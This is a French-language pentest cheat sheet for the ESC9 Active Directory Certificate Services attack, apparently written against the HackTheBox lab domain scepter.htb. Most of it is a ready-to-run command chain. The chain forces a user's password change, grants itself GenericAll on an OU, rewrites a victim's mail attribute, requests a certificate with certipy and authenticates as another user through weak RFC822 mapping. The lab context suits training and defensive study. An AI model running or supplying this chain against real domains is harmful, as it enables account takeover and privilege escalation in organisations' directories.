# ESC9

***

### <mark style="color:red;">ESC9 Attack - GenericAll + Certificate Enrollment</mark>

#### 📖 Concept

ESC9 combine deux vulnérabilités:

1. Permissions `GenericAll` sur un OU contenant des utilisateurs
2. Template de certificat sans extensions de sécurité permettant l'enrollment

#### 🎯 Prérequis

* Compte avec `ForceChangePassword` sur un utilisateur ayant `GenericAll` sur un OU
* Template de certificat vulnérable (pas d'extensions de sécurité)
* Compte cible avec certificat mapping faible

#### 🔍 Enumération

```bash
# Trouver les templates vulnérables
certipy find -u 'd.baker' -hashes ':HASH' -dc-ip <DC_IP> -vulnerable

# Chercher ESC9
# [!] Vulnerabilities
#   ESC9: 'SCEPTER.HTB\\staff' can enroll and template has no security extension
```

#### 💣 Chaîne d'exploitation

**Étape 1 : Changer le mot de passe (ForceChangePassword)**

```bash
# Méthode 1: NetExec
netexec smb scepter.htb -u d.baker -H HASH \
    -M change-password -o USER=a.carter NEWPASS='Welcome1'

# Méthode 2: BloodyAD
bloodyAD --host <DC_IP> -d scepter.htb -u d.baker -p :HASH \
    set password "a.carter" 'Welcome1'

# Méthode 3: Kerberos (avec TGT)
export KRB5CCNAME=d.baker.ccache
net rpc user password 'a.carter' --use-kerberos=required -S dc01.scepter.htb
```

**Étape 2 : Ajouter GenericAll avec héritage sur l'OU**

```bash
# Avec Impacket
impacket-dacledit -action 'write' -rights 'FullControl' \
    -inheritance -principal 'a.carter' \
    -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' \
    'scepter.htb/a.carter:Welcome1'

# Avec BloodyAD
bloodyAD -d scepter.htb -u a.carter -p 'Welcome1' \
    --host scepter.htb add genericAll \
    "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
```

**Étape 3 : Modifier l'email de la victime**

```bash
# LDAP modify
ldapmodify -x -D 'a.carter@scepter.htb' -w 'Welcome1' \
    -H 'ldap://dc01.scepter.htb' <<EOF
dn: CN=D.BAKER,OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
changetype: modify
add: mail
mail: h.brown@scepter.htb
EOF

# BloodyAD
bloodyAD -d scepter.htb -u a.carter -p 'Welcome1' \
    --host scepter.htb set object d.baker mail -v h.brown@scepter.htb
```

**Étape 4 : Demander un certificat**

```bash
certipy req -username "d.baker@scepter.htb" \
    -hashes :HASH \
    -target dc01.scepter.htb \
    -ca 'scepter-DC01-CA' \
    -template 'StaffAccessCertificate'
```

**Étape 5 : Nettoyer (optionnel)**

```bash
# Retirer l'email
ldapmodify -x -D 'a.carter@scepter.htb' -w 'Welcome1' \
    -H 'ldap://dc01.scepter.htb' <<EOF
dn: CN=D.BAKER,OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
changetype: modify
delete: mail
EOF
```

**Étape 6 : Authentification avec le certificat**

```bash
sudo ntpdate <DC_IP>
certipy auth -pfx d.baker.pfx -username h.brown \
    -domain scepter.htb -dc-ip <DC_IP>
```

#### 🎯 Pourquoi ça marche?

* Le certificat contient `emailAddress=h.brown@scepter.htb`
* h.brown a `altSecurityIdentities=X509:<RFC822>h.brown@scepter.htb`
* Le mapping faible RFC822 fait correspondre l'email du certificat

***
